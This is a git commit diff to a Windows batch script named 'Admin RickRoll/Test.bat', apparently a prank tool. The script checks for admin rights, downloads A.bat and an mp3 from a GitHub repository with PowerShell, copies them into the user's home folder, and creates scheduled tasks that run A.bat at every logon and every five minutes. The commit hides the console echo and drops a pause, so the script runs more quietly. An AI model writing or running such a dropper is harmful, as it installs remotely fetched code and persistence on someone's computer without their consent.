7fee916de14670f75e517d0ecdd3b6c4b7406498
Babyporkchop <93239527+Babyporkchop@users.noreply.github.com>
2022-08-02 12:30:59 +0800

    Update Test.bat

--- Admin RickRoll/Test.bat
+++ Admin RickRoll/Test.bat
@@ -1,4 +1,4 @@
-@echo on
+@echo off
  whoami /all | findstr S-1-16-12288 > nul
  if %errorlevel%==1 goto NotAdmin
 cd /D "%~dp0"
@@ -7,7 +7,6 @@ Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkcho
 Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Admin RickRoll/A.bat' -OutFile .\A.bat
 copy rickroll.mp3 "C:%homepath%"
 copy A.bat "C:%homepath%"
-timeout -1
 Schtasks /create /sc ONLOGON /tn L /tr "C:%homepath%\A.bat" 
 Schtasks /create /sc DAILY /tn LOL /tr "C:%homepath%\A.bat" /ri 5 /du 24:00
 cd "C:%homepath%"
